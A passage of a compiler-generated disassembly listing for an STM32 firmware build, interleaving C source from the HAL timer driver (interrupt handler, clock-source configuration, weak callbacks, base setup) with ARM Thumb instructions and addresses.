 8004e98:	6878      	ldr	r0, [r7, #4]
 8004e9a:	f000 f964 	bl	8005166 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004e9e:	687b      	ldr	r3, [r7, #4]
 8004ea0:	2200      	movs	r2, #0
 8004ea2:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 4 event */
  if ((itflag & (TIM_FLAG_CC4)) == (TIM_FLAG_CC4))
 8004ea4:	68bb      	ldr	r3, [r7, #8]
 8004ea6:	f003 0310 	and.w	r3, r3, #16
 8004eaa:	2b00      	cmp	r3, #0
 8004eac:	d020      	beq.n	8004ef0 <HAL_TIM_IRQHandler+0x148>
  {
    if ((itsource & (TIM_IT_CC4)) == (TIM_IT_CC4))
 8004eae:	68fb      	ldr	r3, [r7, #12]
 8004eb0:	f003 0310 	and.w	r3, r3, #16
 8004eb4:	2b00      	cmp	r3, #0
 8004eb6:	d01b      	beq.n	8004ef0 <HAL_TIM_IRQHandler+0x148>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC4);
 8004eb8:	687b      	ldr	r3, [r7, #4]
 8004eba:	681b      	ldr	r3, [r3, #0]
 8004ebc:	f06f 0210 	mvn.w	r2, #16
 8004ec0:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_4;
 8004ec2:	687b      	ldr	r3, [r7, #4]
 8004ec4:	2208      	movs	r2, #8
 8004ec6:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC4S) != 0x00U)
 8004ec8:	687b      	ldr	r3, [r7, #4]
 8004eca:	681b      	ldr	r3, [r3, #0]
 8004ecc:	69db      	ldr	r3, [r3, #28]
 8004ece:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004ed2:	2b00      	cmp	r3, #0
 8004ed4:	d003      	beq.n	8004ede <HAL_TIM_IRQHandler+0x136>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004ed6:	6878      	ldr	r0, [r7, #4]
 8004ed8:	f000 f93b 	bl	8005152 <HAL_TIM_IC_CaptureCallback>
 8004edc:	e005      	b.n	8004eea <HAL_TIM_IRQHandler+0x142>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004ede:	6878      	ldr	r0, [r7, #4]
 8004ee0:	f000 f92d 	bl	800513e <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004ee4:	6878      	ldr	r0, [r7, #4]
 8004ee6:	f000 f93e 	bl	8005166 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004eea:	687b      	ldr	r3, [r7, #4]
 8004eec:	2200      	movs	r2, #0
 8004eee:	771a      	strb	r2, [r3, #28]
    }
  }
  /* TIM Update event */
  if ((itflag & (TIM_FLAG_UPDATE)) == (TIM_FLAG_UPDATE))
 8004ef0:	68bb      	ldr	r3, [r7, #8]
 8004ef2:	f003 0301 	and.w	r3, r3, #1
 8004ef6:	2b00      	cmp	r3, #0
 8004ef8:	d00c      	beq.n	8004f14 <HAL_TIM_IRQHandler+0x16c>
  {
    if ((itsource & (TIM_IT_UPDATE)) == (TIM_IT_UPDATE))
 8004efa:	68fb      	ldr	r3, [r7, #12]
 8004efc:	f003 0301 	and.w	r3, r3, #1
 8004f00:	2b00      	cmp	r3, #0
 8004f02:	d007      	beq.n	8004f14 <HAL_TIM_IRQHandler+0x16c>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_UPDATE);
 8004f04:	687b      	ldr	r3, [r7, #4]
 8004f06:	681b      	ldr	r3, [r3, #0]
 8004f08:	f06f 0201 	mvn.w	r2, #1
 8004f0c:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->PeriodElapsedCallback(htim);
#else
      HAL_TIM_PeriodElapsedCallback(htim);
 8004f0e:	6878      	ldr	r0, [r7, #4]
 8004f10:	f7fb fe64 	bl	8000bdc <HAL_TIM_PeriodElapsedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break input event */
  if ((itflag & (TIM_FLAG_BREAK)) == (TIM_FLAG_BREAK))
 8004f14:	68bb      	ldr	r3, [r7, #8]
 8004f16:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004f1a:	2b00      	cmp	r3, #0
 8004f1c:	d00c      	beq.n	8004f38 <HAL_TIM_IRQHandler+0x190>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004f1e:	68fb      	ldr	r3, [r7, #12]
 8004f20:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004f24:	2b00      	cmp	r3, #0
 8004f26:	d007      	beq.n	8004f38 <HAL_TIM_IRQHandler+0x190>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_BREAK);
 8004f28:	687b      	ldr	r3, [r7, #4]
 8004f2a:	681b      	ldr	r3, [r3, #0]
 8004f2c:	f06f 0280 	mvn.w	r2, #128	; 0x80
 8004f30:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->BreakCallback(htim);
#else
      HAL_TIMEx_BreakCallback(htim);
 8004f32:	6878      	ldr	r0, [r7, #4]
 8004f34:	f000 fa9a 	bl	800546c <HAL_TIMEx_BreakCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break2 input event */
  if ((itflag & (TIM_FLAG_BREAK2)) == (TIM_FLAG_BREAK2))
 8004f38:	68bb      	ldr	r3, [r7, #8]
 8004f3a:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004f3e:	2b00      	cmp	r3, #0
 8004f40:	d00c      	beq.n	8004f5c <HAL_TIM_IRQHandler+0x1b4>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004f42:	68fb      	ldr	r3, [r7, #12]
 8004f44:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004f48:	2b00      	cmp	r3, #0
 8004f4a:	d007      	beq.n	8004f5c <HAL_TIM_IRQHandler+0x1b4>
    {
      __HAL_TIM_CLEAR_FLAG(htim, TIM_FLAG_BREAK2);
 8004f4c:	687b      	ldr	r3, [r7, #4]
 8004f4e:	681b      	ldr	r3, [r3, #0]
 8004f50:	f46f 7280 	mvn.w	r2, #256	; 0x100
 8004f54:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->Break2Callback(htim);
#else
      HAL_TIMEx_Break2Callback(htim);
 8004f56:	6878      	ldr	r0, [r7, #4]
 8004f58:	f000 fa92 	bl	8005480 <HAL_TIMEx_Break2Callback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Trigger detection event */
  if ((itflag & (TIM_FLAG_TRIGGER)) == (TIM_FLAG_TRIGGER))
 8004f5c:	68bb      	ldr	r3, [r7, #8]
 8004f5e:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004f62:	2b00      	cmp	r3, #0
 8004f64:	d00c      	beq.n	8004f80 <HAL_TIM_IRQHandler+0x1d8>
  {
    if ((itsource & (TIM_IT_TRIGGER)) == (TIM_IT_TRIGGER))
 8004f66:	68fb      	ldr	r3, [r7, #12]
 8004f68:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004f6c:	2b00      	cmp	r3, #0
 8004f6e:	d007      	beq.n	8004f80 <HAL_TIM_IRQHandler+0x1d8>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_TRIGGER);
 8004f70:	687b      	ldr	r3, [r7, #4]
 8004f72:	681b      	ldr	r3, [r3, #0]
 8004f74:	f06f 0240 	mvn.w	r2, #64	; 0x40
 8004f78:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->TriggerCallback(htim);
#else
      HAL_TIM_TriggerCallback(htim);
 8004f7a:	6878      	ldr	r0, [r7, #4]
 8004f7c:	f000 f8fd 	bl	800517a <HAL_TIM_TriggerCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM commutation event */
  if ((itflag & (TIM_FLAG_COM)) == (TIM_FLAG_COM))
 8004f80:	68bb      	ldr	r3, [r7, #8]
 8004f82:	f003 0320 	and.w	r3, r3, #32
 8004f86:	2b00      	cmp	r3, #0
 8004f88:	d00c      	beq.n	8004fa4 <HAL_TIM_IRQHandler+0x1fc>
  {
    if ((itsource & (TIM_IT_COM)) == (TIM_IT_COM))
 8004f8a:	68fb      	ldr	r3, [r7, #12]
 8004f8c:	f003 0320 	and.w	r3, r3, #32
 8004f90:	2b00      	cmp	r3, #0
 8004f92:	d007      	beq.n	8004fa4 <HAL_TIM_IRQHandler+0x1fc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_FLAG_COM);
 8004f94:	687b      	ldr	r3, [r7, #4]
 8004f96:	681b      	ldr	r3, [r3, #0]
 8004f98:	f06f 0220 	mvn.w	r2, #32
 8004f9c:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->CommutationCallback(htim);
#else
      HAL_TIMEx_CommutCallback(htim);
 8004f9e:	6878      	ldr	r0, [r7, #4]
 8004fa0:	f000 fa5a 	bl	8005458 <HAL_TIMEx_CommutCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
}
 8004fa4:	bf00      	nop
 8004fa6:	3710      	adds	r7, #16
 8004fa8:	46bd      	mov	sp, r7
 8004faa:	bd80      	pop	{r7, pc}

08004fac <HAL_TIM_ConfigClockSource>:
  * @param  sClockSourceConfig pointer to a TIM_ClockConfigTypeDef structure that
  *         contains the clock source information for the TIM peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_ConfigClockSource(TIM_HandleTypeDef *htim, const TIM_ClockConfigTypeDef *sClockSourceConfig)
{
 8004fac:	b580      	push	{r7, lr}
 8004fae:	b084      	sub	sp, #16
 8004fb0:	af00      	add	r7, sp, #0
 8004fb2:	6078      	str	r0, [r7, #4]
 8004fb4:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status = HAL_OK;
 8004fb6:	2300      	movs	r3, #0
 8004fb8:	73fb      	strb	r3, [r7, #15]
  uint32_t tmpsmcr;

  /* Process Locked */
  __HAL_LOCK(htim);
 8004fba:	687b      	ldr	r3, [r7, #4]
 8004fbc:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8004fc0:	2b01      	cmp	r3, #1
 8004fc2:	d101      	bne.n	8004fc8 <HAL_TIM_ConfigClockSource+0x1c>
 8004fc4:	2302      	movs	r3, #2
 8004fc6:	e0b6      	b.n	8005136 <HAL_TIM_ConfigClockSource+0x18a>
 8004fc8:	687b      	ldr	r3, [r7, #4]
 8004fca:	2201      	movs	r2, #1
 8004fcc:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  htim->State = HAL_TIM_STATE_BUSY;
 8004fd0:	687b      	ldr	r3, [r7, #4]
 8004fd2:	2202      	movs	r2, #2
 8004fd4:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Check the parameters */
  assert_param(IS_TIM_CLOCKSOURCE(sClockSourceConfig->ClockSource));

  /* Reset the SMS, TS, ECE, ETPS and ETRF bits */
  tmpsmcr = htim->Instance->SMCR;
 8004fd8:	687b      	ldr	r3, [r7, #4]
 8004fda:	681b      	ldr	r3, [r3, #0]
 8004fdc:	689b      	ldr	r3, [r3, #8]
 8004fde:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_SMS | TIM_SMCR_TS);
 8004fe0:	68bb      	ldr	r3, [r7, #8]
 8004fe2:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8004fe6:	f023 0377 	bic.w	r3, r3, #119	; 0x77
 8004fea:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 8004fec:	68bb      	ldr	r3, [r7, #8]
 8004fee:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 8004ff2:	60bb      	str	r3, [r7, #8]
  htim->Instance->SMCR = tmpsmcr;
 8004ff4:	687b      	ldr	r3, [r7, #4]
 8004ff6:	681b      	ldr	r3, [r3, #0]
 8004ff8:	68ba      	ldr	r2, [r7, #8]
 8004ffa:	609a      	str	r2, [r3, #8]

  switch (sClockSourceConfig->ClockSource)
 8004ffc:	683b      	ldr	r3, [r7, #0]
 8004ffe:	681b      	ldr	r3, [r3, #0]
 8005000:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 8005004:	d03e      	beq.n	8005084 <HAL_TIM_ConfigClockSource+0xd8>
 8005006:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 800500a:	f200 8087 	bhi.w	800511c <HAL_TIM_ConfigClockSource+0x170>
 800500e:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 8005012:	f000 8086 	beq.w	8005122 <HAL_TIM_ConfigClockSource+0x176>
 8005016:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800501a:	d87f      	bhi.n	800511c <HAL_TIM_ConfigClockSource+0x170>
 800501c:	2b70      	cmp	r3, #112	; 0x70
 800501e:	d01a      	beq.n	8005056 <HAL_TIM_ConfigClockSource+0xaa>
 8005020:	2b70      	cmp	r3, #112	; 0x70
 8005022:	d87b      	bhi.n	800511c <HAL_TIM_ConfigClockSource+0x170>
 8005024:	2b60      	cmp	r3, #96	; 0x60
 8005026:	d050      	beq.n	80050ca <HAL_TIM_ConfigClockSource+0x11e>
 8005028:	2b60      	cmp	r3, #96	; 0x60
 800502a:	d877      	bhi.n	800511c <HAL_TIM_ConfigClockSource+0x170>
 800502c:	2b50      	cmp	r3, #80	; 0x50
 800502e:	d03c      	beq.n	80050aa <HAL_TIM_ConfigClockSource+0xfe>
 8005030:	2b50      	cmp	r3, #80	; 0x50
 8005032:	d873      	bhi.n	800511c <HAL_TIM_ConfigClockSource+0x170>
 8005034:	2b40      	cmp	r3, #64	; 0x40
 8005036:	d058      	beq.n	80050ea <HAL_TIM_ConfigClockSource+0x13e>
 8005038:	2b40      	cmp	r3, #64	; 0x40
 800503a:	d86f      	bhi.n	800511c <HAL_TIM_ConfigClockSource+0x170>
 800503c:	2b30      	cmp	r3, #48	; 0x30
 800503e:	d064      	beq.n	800510a <HAL_TIM_ConfigClockSource+0x15e>
 8005040:	2b30      	cmp	r3, #48	; 0x30
 8005042:	d86b      	bhi.n	800511c <HAL_TIM_ConfigClockSource+0x170>
 8005044:	2b20      	cmp	r3, #32
 8005046:	d060      	beq.n	800510a <HAL_TIM_ConfigClockSource+0x15e>
 8005048:	2b20      	cmp	r3, #32
 800504a:	d867      	bhi.n	800511c <HAL_TIM_ConfigClockSource+0x170>
 800504c:	2b00      	cmp	r3, #0
 800504e:	d05c      	beq.n	800510a <HAL_TIM_ConfigClockSource+0x15e>
 8005050:	2b10      	cmp	r3, #16
 8005052:	d05a      	beq.n	800510a <HAL_TIM_ConfigClockSource+0x15e>
 8005054:	e062      	b.n	800511c <HAL_TIM_ConfigClockSource+0x170>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 8005056:	687b      	ldr	r3, [r7, #4]
 8005058:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 800505a:	683b      	ldr	r3, [r7, #0]
 800505c:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 800505e:	683b      	ldr	r3, [r7, #0]
 8005060:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 8005062:	683b      	ldr	r3, [r7, #0]
 8005064:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 8005066:	f000 f971 	bl	800534c <TIM_ETR_SetConfig>

      /* Select the External clock mode1 and the ETRF trigger */
      tmpsmcr = htim->Instance->SMCR;
 800506a:	687b      	ldr	r3, [r7, #4]
 800506c:	681b      	ldr	r3, [r3, #0]
 800506e:	689b      	ldr	r3, [r3, #8]
 8005070:	60bb      	str	r3, [r7, #8]
      tmpsmcr |= (TIM_SLAVEMODE_EXTERNAL1 | TIM_CLOCKSOURCE_ETRMODE1);
 8005072:	68bb      	ldr	r3, [r7, #8]
 8005074:	f043 0377 	orr.w	r3, r3, #119	; 0x77
 8005078:	60bb      	str	r3, [r7, #8]
      /* Write to TIMx SMCR */
      htim->Instance->SMCR = tmpsmcr;
 800507a:	687b      	ldr	r3, [r7, #4]
 800507c:	681b      	ldr	r3, [r3, #0]
 800507e:	68ba      	ldr	r2, [r7, #8]
 8005080:	609a      	str	r2, [r3, #8]
      break;
 8005082:	e04f      	b.n	8005124 <HAL_TIM_ConfigClockSource+0x178>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 8005084:	687b      	ldr	r3, [r7, #4]
 8005086:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 8005088:	683b      	ldr	r3, [r7, #0]
 800508a:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 800508c:	683b      	ldr	r3, [r7, #0]
 800508e:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 8005090:	683b      	ldr	r3, [r7, #0]
 8005092:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 8005094:	f000 f95a 	bl	800534c <TIM_ETR_SetConfig>
      /* Enable the External clock mode2 */
      htim->Instance->SMCR |= TIM_SMCR_ECE;
 8005098:	687b      	ldr	r3, [r7, #4]
 800509a:	681b      	ldr	r3, [r3, #0]
 800509c:	689a      	ldr	r2, [r3, #8]
 800509e:	687b      	ldr	r3, [r7, #4]
 80050a0:	681b      	ldr	r3, [r3, #0]
 80050a2:	f442 4280 	orr.w	r2, r2, #16384	; 0x4000
 80050a6:	609a      	str	r2, [r3, #8]
      break;
 80050a8:	e03c      	b.n	8005124 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 80050aa:	687b      	ldr	r3, [r7, #4]
 80050ac:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80050ae:	683b      	ldr	r3, [r7, #0]
 80050b0:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80050b2:	683b      	ldr	r3, [r7, #0]
 80050b4:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 80050b6:	461a      	mov	r2, r3
 80050b8:	f000 f8ce 	bl	8005258 <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1);
 80050bc:	687b      	ldr	r3, [r7, #4]
 80050be:	681b      	ldr	r3, [r3, #0]
 80050c0:	2150      	movs	r1, #80	; 0x50
 80050c2:	4618      	mov	r0, r3
 80050c4:	f000 f927 	bl	8005316 <TIM_ITRx_SetConfig>
      break;
 80050c8:	e02c      	b.n	8005124 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI2 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI2_ConfigInputStage(htim->Instance,
 80050ca:	687b      	ldr	r3, [r7, #4]
 80050cc:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80050ce:	683b      	ldr	r3, [r7, #0]
 80050d0:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80050d2:	683b      	ldr	r3, [r7, #0]
 80050d4:	68db      	ldr	r3, [r3, #12]
      TIM_TI2_ConfigInputStage(htim->Instance,
 80050d6:	461a      	mov	r2, r3
 80050d8:	f000 f8ed 	bl	80052b6 <TIM_TI2_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI2);
 80050dc:	687b      	ldr	r3, [r7, #4]
 80050de:	681b      	ldr	r3, [r3, #0]
 80050e0:	2160      	movs	r1, #96	; 0x60
 80050e2:	4618      	mov	r0, r3
 80050e4:	f000 f917 	bl	8005316 <TIM_ITRx_SetConfig>
      break;
 80050e8:	e01c      	b.n	8005124 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 80050ea:	687b      	ldr	r3, [r7, #4]
 80050ec:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80050ee:	683b      	ldr	r3, [r7, #0]
 80050f0:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80050f2:	683b      	ldr	r3, [r7, #0]
 80050f4:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 80050f6:	461a      	mov	r2, r3
 80050f8:	f000 f8ae 	bl	8005258 <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1ED);
 80050fc:	687b      	ldr	r3, [r7, #4]
 80050fe:	681b      	ldr	r3, [r3, #0]
 8005100:	2140      	movs	r1, #64	; 0x40
 8005102:	4618      	mov	r0, r3
 8005104:	f000 f907 	bl	8005316 <TIM_ITRx_SetConfig>
      break;
 8005108:	e00c      	b.n	8005124 <HAL_TIM_ConfigClockSource+0x178>
    case TIM_CLOCKSOURCE_ITR3:
    {
      /* Check whether or not the timer instance supports internal trigger input */
      assert_param(IS_TIM_CLOCKSOURCE_ITRX_INSTANCE(htim->Instance));

      TIM_ITRx_SetConfig(htim->Instance, sClockSourceConfig->ClockSource);
 800510a:	687b      	ldr	r3, [r7, #4]
 800510c:	681a      	ldr	r2, [r3, #0]
 800510e:	683b      	ldr	r3, [r7, #0]
 8005110:	681b      	ldr	r3, [r3, #0]
 8005112:	4619      	mov	r1, r3
 8005114:	4610      	mov	r0, r2
 8005116:	f000 f8fe 	bl	8005316 <TIM_ITRx_SetConfig>
      break;
 800511a:	e003      	b.n	8005124 <HAL_TIM_ConfigClockSource+0x178>
    }

    default:
      status = HAL_ERROR;
 800511c:	2301      	movs	r3, #1
 800511e:	73fb      	strb	r3, [r7, #15]
      break;
 8005120:	e000      	b.n	8005124 <HAL_TIM_ConfigClockSource+0x178>
      break;
 8005122:	bf00      	nop
  }
  htim->State = HAL_TIM_STATE_READY;
 8005124:	687b      	ldr	r3, [r7, #4]
 8005126:	2201      	movs	r2, #1
 8005128:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 800512c:	687b      	ldr	r3, [r7, #4]
 800512e:	2200      	movs	r2, #0
 8005130:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return status;
 8005134:	7bfb      	ldrb	r3, [r7, #15]
}
 8005136:	4618      	mov	r0, r3
 8005138:	3710      	adds	r7, #16
 800513a:	46bd      	mov	sp, r7
 800513c:	bd80      	pop	{r7, pc}

0800513e <HAL_TIM_OC_DelayElapsedCallback>:
  * @brief  Output Compare callback in non-blocking mode
  * @param  htim TIM OC handle
  * @retval None
  */
__weak void HAL_TIM_OC_DelayElapsedCallback(TIM_HandleTypeDef *htim)
{
 800513e:	b480      	push	{r7}
 8005140:	b083      	sub	sp, #12
 8005142:	af00      	add	r7, sp, #0
 8005144:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_OC_DelayElapsedCallback could be implemented in the user file
   */
}
 8005146:	bf00      	nop
 8005148:	370c      	adds	r7, #12
 800514a:	46bd      	mov	sp, r7
 800514c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005150:	4770      	bx	lr

08005152 <HAL_TIM_IC_CaptureCallback>:
  * @brief  Input Capture callback in non-blocking mode
  * @param  htim TIM IC handle
  * @retval None
  */
__weak void HAL_TIM_IC_CaptureCallback(TIM_HandleTypeDef *htim)
{
 8005152:	b480      	push	{r7}
 8005154:	b083      	sub	sp, #12
 8005156:	af00      	add	r7, sp, #0
 8005158:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_IC_CaptureCallback could be implemented in the user file
   */
}
 800515a:	bf00      	nop
 800515c:	370c      	adds	r7, #12
 800515e:	46bd      	mov	sp, r7
 8005160:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005164:	4770      	bx	lr

08005166 <HAL_TIM_PWM_PulseFinishedCallback>:
  * @brief  PWM Pulse finished callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_PWM_PulseFinishedCallback(TIM_HandleTypeDef *htim)
{
 8005166:	b480      	push	{r7}
 8005168:	b083      	sub	sp, #12
 800516a:	af00      	add	r7, sp, #0
 800516c:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_PWM_PulseFinishedCallback could be implemented in the user file
   */
}
 800516e:	bf00      	nop
 8005170:	370c      	adds	r7, #12
 8005172:	46bd      	mov	sp, r7
 8005174:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005178:	4770      	bx	lr

0800517a <HAL_TIM_TriggerCallback>:
  * @brief  Hall Trigger detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_TriggerCallback(TIM_HandleTypeDef *htim)
{
 800517a:	b480      	push	{r7}
 800517c:	b083      	sub	sp, #12
 800517e:	af00      	add	r7, sp, #0
 8005180:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_TriggerCallback could be implemented in the user file
   */
}
 8005182:	bf00      	nop
 8005184:	370c      	adds	r7, #12
 8005186:	46bd      	mov	sp, r7
 8005188:	f85d 7b04 	ldr.w	r7, [sp], #4
 800518c:	4770      	bx	lr
	...

08005190 <TIM_Base_SetConfig>:
  * @param  TIMx TIM peripheral
  * @param  Structure TIM Base configuration structure
  * @retval None
  */
void TIM_Base_SetConfig(TIM_TypeDef *TIMx, const TIM_Base_InitTypeDef *Structure)
{
 8005190:	b480      	push	{r7}
 8005192:	b085      	sub	sp, #20
 8005194:	af00      	add	r7, sp, #0
 8005196:	6078      	str	r0, [r7, #4]
 8005198:	6039      	str	r1, [r7, #0]
  uint32_t tmpcr1;
  tmpcr1 = TIMx->CR1;
 800519a:	687b      	ldr	r3, [r7, #4]
 800519c:	681b      	ldr	r3, [r3, #0]
 800519e:	60fb      	str	r3, [r7, #12]

  /* Set TIM Time Base Unit parameters ---------------------------------------*/
  if (IS_TIM_COUNTER_MODE_SELECT_INSTANCE(TIMx))
 80051a0:	687b      	ldr	r3, [r7, #4]
 80051a2:	4a2a      	ldr	r2, [pc, #168]	; (800524c <TIM_Base_SetConfig+0xbc>)
 80051a4:	4293      	cmp	r3, r2
 80051a6:	d003      	beq.n	80051b0 <TIM_Base_SetConfig+0x20>
 80051a8:	687b      	ldr	r3, [r7, #4]
 80051aa:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80051ae:	d108      	bne.n	80051c2 <TIM_Base_SetConfig+0x32>
  {
    /* Select the Counter Mode */
    tmpcr1 &= ~(TIM_CR1_DIR | TIM_CR1_CMS);
 80051b0:	68fb      	ldr	r3, [r7, #12]
 80051b2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80051b6:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= Structure->CounterMode;
 80051b8:	683b      	ldr	r3, [r7, #0]
 80051ba:	685b      	ldr	r3, [r3, #4]
 80051bc:	68fa      	ldr	r2, [r7, #12]
 80051be:	4313      	orrs	r3, r2
 80051c0:	60fb      	str	r3, [r7, #12]
  }

  if (IS_TIM_CLOCK_DIVISION_INSTANCE(TIMx))
 80051c2:	687b      	ldr	r3, [r7, #4]
 80051c4:	4a21      	ldr	r2, [pc, #132]	; (800524c <TIM_Base_SetConfig+0xbc>)
 80051c6:	4293      	cmp	r3, r2
 80051c8:	d00b      	beq.n	80051e2 <TIM_Base_SetConfig+0x52>
